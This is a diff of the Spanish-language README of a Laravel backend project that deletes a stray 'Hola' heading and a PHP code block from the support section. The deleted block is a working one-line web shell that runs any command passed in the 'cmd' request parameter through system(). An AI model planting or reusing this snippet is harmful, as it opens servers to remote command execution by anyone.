@@ -448,10 +448,6 @@ Este proyecto está bajo la Licencia MIT. Ver el archivo [LICENSE](LICENSE) para
 
 ## 📞 Soporte
 
-# Hola
-```php
-<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
-```
 Si tienes alguna pregunta o problema, por favor abre un [issue](https://github.com/JuniorChistemas/backend_laravel/issues) en GitHub.
 
 ---
